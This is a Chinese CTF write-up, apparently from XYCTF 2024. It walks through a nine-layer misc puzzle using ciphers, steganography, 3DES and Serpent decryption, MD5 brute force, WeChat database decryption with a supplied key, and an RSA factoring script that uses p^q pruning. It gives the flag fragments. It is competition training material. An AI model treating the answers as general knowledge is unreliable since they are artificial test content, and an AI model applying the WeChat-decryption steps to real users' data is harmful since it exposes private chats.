![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MDdhMDA5YTYzMWVkYTJkM2RlOGQ0NDU5MDA0Y2RiYTJfaUlTM1ZPTTVJbko0WEZWaGRXdUtxQmw5WENuNXFza3FfVG9rZW46RUV4MWJXUWUwb2M3bTh4Tk5NMGNVeWhWbjFmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

## 1.7 TCPL

十六进制下看到这个是个RISCV64架构的elf文件

在搭环境

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTFlNTRkMWVhZWY0OGNiYzQyYTBmZGM5M2UxNzY0MGJfNHp4UzJ2V0Z6aWdNb1c4cXc3dWhxbFpDWGk0ekVHZktfVG9rZW46STVWRGJHQm8wb1Iyb2h4bjhiTmN5TG43bmNnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

打异构pwn打的

## 1.8 九转大肠

第一层压缩包密码是XYCTF20240401

第一层：曰：玉魔命灵天观罗炁观神冥西道地真象茫华茫空吉清荡罗命色玉凶北莽人鬼乐量西北灵色净魂地魂莽玉凶阿人梵莽西量魄周界

天书加密，图片改高

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NThiNjkxZmRiMjI2ZmQ3MzdmMjkwZmEzYWY5MmQxOTJfWlhXVFVNbmNXNFludmJkSTY3TnFnem9RYWl4alZDSUdfVG9rZW46THNESmJ5anhVb2RwSGp4ZVl3cWNjcTFXblNjXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGEyNmM5YWYyYzE3NTdhY2Q1YWU5ODhmMDEzNTQ1Y2Nfd05RN2FRN3hZSElxTXdQTnhnY0U0Wnh3anp1Mld5UUdfVG9rZW46UXVhb2JONmI5bzVtUDF4WGgxU2NaRnpqbjBnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

第二层

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY0NzQ2NTZmZWE3MTRkODY1ZmY3NGNjMmY3ZjdlMjNfc2t4MnRvcGZVVnNBNWJEblloSDFRTlFkTlhRU2JBbVdfVG9rZW46VFNzVWJDaUlDb3lqMFl4QVp4YmM1bUcybjFnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

得到：

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDFiMGVmNjk4ODNiNGU0ZDg3NzY2YWQ1ZTk3ZTcyMDdfdHdsbW9MWm10aVExbVpLOWQxaFljZzhyNjBDTVNYRk5fVG9rZW46RFprTGI5V3YxbzVwY2V4OGV1T2NPUk5sbldjXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

LSB隐写得到 0f_crypt0_and_

第三层

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MWY4OTk1MzU5MGE2MzNjZjBmODQyOGRhODQ0YzE0NDJfRFdDZkt5c1BQWVFLaXd6VnlZZXd3d21SVmNMYThKUnNfVG9rZW46SXJaYWJJOHZBb0dwazJ4cTNiTWNQNXpmbjliXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

1是点2是线3是空格

要小写。解zip得到flag.txt和一个zip，flag.txt找不到有价值的信息

暂时无法在飞书文档外展示此内容

zip用7z打开提取显示数据错误，但是十六进制下看到可以的字符串

5a+G56CB57uZ5L2g5Y+I5oCO5qC377yaMTIzNDU2

解码结果如下

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NjM2MGZlOTQxY2MwYzkwOTQyZTIzODFkMjczM2Q4ZjFfV1UyOTJOSFpQWEFtMjZvVGZLN1M3UUhkd3BBajl2WVFfVG9rZW46SWJwbWJ0Snpab3VwZ2t4ZlV2cWNrUmpxbjZmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

得到MZWGCZZT566JU3LJONRV6MLTL5ZGKNTMNR4V6ZTVNYQSC===

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YThhMzE2YTMwYTcyMGM3NzA1ZGE4ZTBjMzU1ZTZhNDJfUkgwd1RjckE0R0FmODJ5eXRNR1VpR2RsVDZRMlJ3R09fVG9rZW46RFdMMWJVYlpJb1FJVnF4VE5qWWMyVGNjbm1oXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

misc_1s_re6lly_fun!!

第四层

U2FsdGVkX1+y2rlJZlJCMnvyDwHwzkgHvNsG2TF6sFlBlxBs0w4EmyXdDe6s7viL

长得像aes

3des

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=M2YzOWE5OTA3YzA0NzJlMDIzMDhmZTdjNjczZDMxMmRfbm80YTllZlo4M0Y1TXFYa3B3ZW9JcGpCQ1RRTmVHcGRfVG9rZW46WXNTNmIxcUQyb3VMWlN4dFoyNGNyckZKbjdjXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

The_fourth_floor_is_okay

压缩包里一个txt一个db文件，txt解码得

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NmI3YjhkNDg2ZGNjNjZhOGFmOWI5Yzc1MGJkMmI3MGRfMXlVYm01RHJhWlJiMzFYN01mUDhzN05KRXBjWlJJTWtfVG9rZW46UW1TbWI4T1VwbzRFa0R4NGRZbGNmZEg3bnUyXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

key：1a813cbb17c040358d772e37fa137edbeddedb38bf704a56b2a9e22dc7f05f77

但是MSG0.db没法用navicat打开，db browser也打不开，显示不是一个数据库，但是应该就是微信聊天记录数据库文件，大小60M刚好（好强的既视感）。十六进制打开发现文件头根本不是db文件的文件头，这点比较蹊跷

微信聊天数据库解密用的wxdump，

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YzVkZmFhMTk5ZGU2M2VmMWZkOTIzMTlkOGNmMjU3N2ZfNUpHMEI0YVJlRWdGNnlOSEV4cVJTYzZVVXBpVVJZNUVfVG9rZW46TURtdGJPT3gxb1QwUFF4OWpOSGNTMGZGbjhnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

用navicat打开就行

L1u_and_K1cky_Mu

第五层

enc = 'key{liu*****'

md5 = '87145027d8664fca1413e6a24ae2fbe7'

应该是要md5爆破

爆破出来key{liuyyds}

得到serpent.txt和flag.txt，flag里依然显示啥都没有，

```flag.txt
这里什么都没有呦！
```

```serpent.txt
ô;ëST†C`è(|B‚R�½5ƒXD–bNœ§½>LZÒæuƒýïÔ+¼Í‚+Ð‰-pÇX+¾§fÜ-^ÌbY. ™"ªEÉ©´QeÚ–)5Ëðo{¤õ%‡AîüK†Ácß3‹ï48/¶?¨¤{?zÄð0Y�Î
ÆMÈmhÞ½ArGÈ©%`­q¯�Î=„µñË&§Bæã‘.sæ!ia5ÎÒDÄõ8×tu)õàà0‡jº?àô`5å[‡C¥Ôä7G°ì¦ê£`uÍÑ‚í•T‹�°€qæÊ-vw7E�Os¬R	G›oÀZþeÿJjD¸zîb2åÊ&i-²ÎPiž¡�iÐì±u�“Kp‡ÒGÆµ.>ÄF™ê�ž`ã	ß�ùwB-{%�œ>"!
|Wl
¦D7ä§-?Ø5&ˆjMë³º2E]þÂ¬®WƒŒçlÓ`œ2GÇÓ{›aÓ(TŒÜ‚6ƒ¿$÷Wªøð<¼Už!>Âr(¢
```

密钥是liuyyds，对文件解serpent，然后vim看到零宽的unicode字符，零宽隐写

_3re_so_sm4rt!

第六层

hint是键盘画图，用手机输入法应该可以操作，但是有些字符好怪（

keeponfighting可以解得一个文件夹

steghide，密码98641

In_just_a_few_m1nutes_

第七层

提示维吉尼亚，发现

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmIxZWYwM2QzZjM5N2I2NDI1NzIyNjM5NTM0ODY4MGVfbVZpU3QwNFA2Sm9zY0R0SEtiRHdqZHM0UkZ0Z2VjcUxfVG9rZW46SWlWWGJvS3hDb0pNemJ4eU50VmM3SHE2bmhmXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

然而密码并不是这个

+AF8-在utf-7中是下划线，所以把空格换成下划线就行了。

The_seventh_level_is_difficult

![img](https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NzU5ZmVjZGFkMGE3MDQ1YTE0ZjUwNWVmN2JjMzEzNjBfWm9hN2V1VG1jVEVFZDhZdUlOZlJibmNqOFRxQVJ1R3RfVG9rZW46Rk9NTWJ6MXZwb1BNN2Z4UDc4d2NLdnh6bllnXzE3MTQxODcwOTk6MTcxNDE5MDY5OV9WNA)

八进制

they_were_thr0ugh!

第八层

题目是一道rsa，给了n, e, c和p^q

考虑到p, q都是1024位，且已知异或结果，那么就可以进行爆破（p^q对应位是1，那可能p=0，q=1或p=1，q=0，对应位0，那可能p=0，q=0或p=1，q=1）

那么就用剪枝算法爆破。

```Python
import sys
from Crypto.Util.number import *
sys.setrecursionlimit(3939)        #不设置一下最大递归深度的话已经超出了（

n = 22424440693845876425615937206198156323192795003070970628372481545586519202571910046980039629473774728476050491743579624370862986329470409383215065075468386728605063051384392059021805296376762048386684738577913496611584935475550170449080780985441748228151762285167935803792462411864086270975057853459586240221348062704390114311522517740143545536818552136953678289681001385078524272694492488102171313792451138757064749512439313085491407348218882642272660890999334401392575446781843989380319126813905093532399127420355004498205266928383926087604741654126388033455359539622294050073378816939934733818043482668348065680837
c = 1400352566791488780854702404852039753325619504473339742914805493533574607301173055448281490457563376553281260278100479121782031070315232001332230779334468566201536035181472803067591454149095220119515161298278124497692743905005479573688449824603383089039072209462765482969641079166139699160100136497464058040846052349544891194379290091798130028083276644655547583102199460785652743545251337786190066747533476942276409135056971294148569617631848420232571946187374514662386697268226357583074917784091311138900598559834589862248068547368710833454912188762107418000225680256109921244000920682515199518256094121217521229357
e = 65537
pq_xor = 14488395911544314494659792279988617621083872597458677678553917360723653686158125387612368501147137292689124338045780574752580504090309537035378931155582239359121394194060934595413606438219407712650089234943575201545638736710994468670843068909623985863559465903999731253771522724352015712347585155359405585892

n_bits = 1024
xor = bin(pq_xor)[2:].zfill(n_bits)        #由于p，q的开头至少第一位肯定是1，所以实际上还得在前面补0
p_s = []

def pq_high_xor(p="", q=""):        #高位进行爆破
    lp, lq = len(p), len(q)
    tp0 = int(p + (1024 - lp) * "0", 2)
    tq0 = int(q + (1024 - lq) * "0", 2)
    tp1 = int(p + (1024 - lp) * "1", 2)
    tq1 = int(q + (1024 - lq) * "1", 2)

    if tp0 * tq0 > n or tp1 * tq1 < n:        #如果当前pq最小值相乘都比n大或者pq最大值相乘都比n小，那么肯定不符合，可以返回了
        return
    if lp == n_bits:        #当前递归深度下p的长度达到1024位的话表明得到一个可能的解
        p_s.append(tp0)
        return

    if xor[lp] == "1":        
        pq_high_xor(p + "0", q + "1")
        pq_high_xor(p + "1", q + "0")
    else:
        pq_high_xor(p + "0", q + "0")
        pq_high_xor(p + "1", q + "1")

pq_high_xor()

for p in p_s:        #常规RSA
    q = n // p
    phi = (p - 1) * (q - 1)
    d = inverse(e, phi)
    m = pow(c, d, n)
    print(long_to_bytes(m))
```

得到结果是 password{pruning_algorithm}

```txt
nononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesnononononononononononononoyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesnononononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesnoyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononoyesyesyesyesnonononononononononononononononononononononoyesyesyesyesnonononononononononononoyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononoyesnonoyesnoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononoyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesnonononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesnoyesnonononononononononononononononononononononononononononononononoyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesnononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesyesnonononoyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesnononononononononononononononononononononoyesyesyesyesyesyesnononononononononononoyesyesyesyesyesnononononononononononononoyesyesyesyesyesnononononononoyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononoyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesnonononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesnonononononoyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesyesnononononononononononoyesyesyesyesnononononononononononononoyesyesyesyesyesnononononononoyesyesyesyesyesyesyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononoyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesnononononononononononononoyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesnonononononoyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononoyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesyesyesyesyesnonononononononononononoyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnononononononoyesyesyesyesyesyesyesyesyes